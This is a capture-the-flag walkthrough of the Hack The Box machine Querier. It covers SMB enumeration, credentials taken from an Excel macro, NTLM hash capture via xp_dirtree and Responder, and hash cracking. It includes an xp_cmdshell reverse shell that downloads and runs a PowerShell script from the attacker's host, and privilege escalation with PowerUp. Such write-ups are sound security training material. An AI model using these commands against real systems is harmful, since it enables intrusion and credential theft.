---
title: HTB-Querier
draft: false
tags:
  - htb
  - windows
  - mssql
  - impacket-mssqlclient
  - macros
  - responder
  - xp_cmdshell
  - powerup-ps1
  - medium
---
## Summary
- SMB Null login
- Access to Reports share -> Download xlsm file
- xlsm file macros -> user reporting creds exposed
- MSSQL as reporting
- Relay Attack -> obtain user mssql-svc hash and crack
- MSSQL as mssql-svc
- enable_xp_cmdshell -> reverse shell as mssql-svc
- PowerUp.ps1 -> Administrator password learked
- Evil-Winrm as Administrator
 
## Information Gathering
### Rustscan

Rustscan found SMB, MSSQL, and WinRM open:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/querier]
└─$ rustscan --addresses 10.10.10.125 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛
<snip>
Host is up, received conn-refused (0.62s latency).
Scanned at 2024-03-30 11:29:52 EDT for 4s

PORT      STATE SERVICE      REASON
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
1433/tcp  open  ms-sql-s     syn-ack
5985/tcp  open  wsman        syn-ack
49664/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack
49671/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.60 seconds
```

### Nmap

Namp default script scan discvered Domain name(**htb.local**) which I added to /etc/hosts.

```bash
┌──(yoon㉿kali)-[~/Documents/htb/querier]
└─$ sudo nmap -sVC -p 135,139,1433,5985,49664,49666,49667,49668,49669,49670,49671 -v 10.10.10.125
<snip>
Nmap scan report for 10.10.10.125
Host is up (0.59s latency).

PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
1433/tcp  open  ms-sql-s    Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-03-30T15:34:51+00:00; -3m16s from scanner time.
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-30T15:23:37
| Not valid after:  2054-03-30T15:23:37
| MD5:   4f2d:ab0e:1028:687c:43d6:c493:1b0a:5050
|_SHA-1: e3e8:eed5:7baa:b40a:b2ce:7381:7e5f:302c:f9c3:eeef
5985/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  unknown
49666/tcp open  msrpc       Microsoft Windows RPC
49667/tcp open  msrpc       Microsoft Windows RPC
49668/tcp open  tcpwrapped
49669/tcp open  msrpc       Microsoft Windows RPC
49670/tcp open  unknown
49671/tcp open  tcpwrapped
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<snip>
Nmap done: 1 IP address (1 host up) scanned in 140.12 seconds
           Raw packets sent: 21 (900B) | Rcvd: 16 (708B)
```

## Enmeration
### SMB - TCP 445

Luckily, null login to SMB was allowed:

`smbclient -N -L //10.10.10.125`

![](https://i.imgur.com/56SFhQ7.png)


I only had access to **Reports** share and there was one xlsm file in it: **Reports Currency Volume Reports.xlsm**

![](https://i.imgur.com/9NPnzVM.png)


I downloaded the file to local Kali machine to further look into it.

## MSSQL as reporting
### VBA Script

I tried opening xlsm file using libreoffice calc and it showed me an error saying marcos is running on this xlsm file:

![](https://i.imgur.com/UWwUTlc.png)



I enabled macros by accessing Macro Security Settings: Tools > Options > LibreOffice > Security and setting the security level to Medium

However, even with macros enabled, excel sheet seemed empty:

![](https://i.imgur.com/F70xwdd.png)


I moved on to look at macros script by: Tools > Macros > Organize Macros > LibreOffice Basic....

Under Currency Volume Report.xlsm there was **VBAProject** and it included macros script **connect**:

![](https://i.imgur.com/9DTd5Tt.png)


Script was trying to make a TLS connection to SQL Server and it was exposing username and credentials in plain text -> **reporting**:**PcwTWTHRwryjc$c6**

```sql
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
```

![](https://i.imgur.com/8GYGH80.png)


### MSSQL

Using the credentials found above, now I can access MSSQL:

`mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth`

![](https://i.imgur.com/bR3FwZc.png)



## MSSQL as mssql-svc
### MSSQL Relay Attack



Following [this guide](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack) on Hacktricks, I attempted Relay attack for stealing NetNTLM hash and it worked.

I first started Responder for VPN connection:

`sudo responder -I tun0`

![](https://i.imgur.com/7mAQptg.png)


Now on MSSQL connection, I made a request to Kali's responder:

`xp_dirtree '\\10.10.14.17\home\yoon`

![](https://i.imgur.com/3e75O33.png)



Instantly, reponsder captured NTLM hash for user **mssql-svc**:

![](https://i.imgur.com/OCuWc95.png)


### Hash Cracking

I forwarded the hash to hashcat to crack it and password for mssql-svc was cracked: **corporate568**

`hashcat -m 5600 mssql-svc.hash rockyou.txt`

![](https://i.imgur.com/KbPMlJr.png)

### MSSQL

I was hoping found mssql-svc had access to winrm but unfortunately it didn't:

![](https://i.imgur.com/51aWRpI.png)



However, it did had access to MSSQL, so I made connection to MSSQL mssql-svc:

`mssqlclient.py mssql-svc:corporate568@10.10.10.125 -windows-auth`


## Shell as mssql-svc
Since **mssql-svc** is the SQL managing account, I had a thought that it is gonna have more privilege compared to **reporting**.

I checked the privilege by typing in `help` and mssql-svc had prvilege for **xp_cmdshell**:

![](https://i.imgur.com/ADm124T.png)


I enabled **xp_cmdshell**:

`enable_xp_cmdshell` & `RECONFIGURE`

![](https://i.imgur.com/zDNomDR.png)


Now I can see that I can execute commands:


![](https://i.imgur.com/90dMVe3.png)


### Reverse Shell

To spawn reverse shell, I prepared nishang's **Invoke-PowerShellTcp.ps1** on my attacking directory and started python HTTP server.

Using the command below, I downloaded and executed reverse shell script toward my Kali listener:

`EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.17:8000/ps-rev.ps1") | powershell -noprofile'`

![](https://i.imgur.com/ScVyR6x.png)


Now on my local netcat listener, I have shell as mssql-svc:

![](https://i.imgur.com/NaBRupU.png)




## Privesc: mssql-svc to Administrator

I checked for privileges **mssql-svc** had and I saw **SeImpersonatePrivilege** which is vulnerable to Juicy Potato attack:

`whoami priv`

![](https://i.imgur.com/dz264SE.png)


Unfortunately, Windows Server 2019 is not vulnerable to JuicyPotato Attack so I moved on.

![](https://i.imgur.com/PUr1cOX.png)


### PowerUp.ps1

I decided to run PowerUp.ps1 for enumeration.

I first started powershell sessions on the shell:

![](https://i.imgur.com/ueXGYXv.png)


I downloaded PowerUp.ps1 to **C:\Users\mssql-svc\app-data\local\temp** and ran it:

`xcopy \\10.10.14.17\share\PowerUp.ps1 .`

![](https://i.imgur.com/z2BwkNx.png)


`Invoke-AllChecks` showed me result:

![](https://i.imgur.com/HWl21e9.png)


At the bottom of the scan, I discovered Administrator credential: **MyUnclesAreMarioAndLuigi!!1!**

![](https://i.imgur.com/17Q8sjV.png)


### Evil-Winrm

Administrator shell was obtained:

![](https://i.imgur.com/4X0V3a7.png)
